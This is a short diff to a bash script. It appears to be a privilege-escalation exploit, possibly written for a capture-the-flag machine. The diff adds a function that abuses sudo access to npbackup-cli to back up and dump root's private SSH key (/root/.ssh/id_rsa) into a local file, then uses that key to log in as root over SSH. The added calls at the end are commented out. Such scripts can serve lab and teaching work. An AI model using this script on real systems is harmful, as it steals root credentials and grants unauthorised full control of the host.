@@ -28,6 +28,22 @@ set_vars() {
     fi
 }
 
+ssh_func() {
+    local key="/root/.ssh/id_rsa"
+    local fn="id_rsa"
+    
+    echo "[+] Backing up $key ..."
+    sudo $(which npbackup-cli) -c "$(pwd)/npbackup.conf" --raw "backup $key" >/dev/null
+    
+    echo "[+] Dumping $key to $fn"
+    sudo $(which npbackup-cli) -c "$(pwd)/npbackup.conf" --dump "$key" > "$fn"
+    
+    chmod 600 "$fn"
+    
+    echo "[+] Logging in as root@$(cat /etc/hostname) ..."
+    ssh -i "$fn" root@127.0.0.1
+}
+
 main() {
     local file="/root/.ssh/id_rsa"
 
@@ -44,3 +60,7 @@ banner
 initSudo
 set_vars
 main
+
+#banner
+#initSudo
+#ssh_func
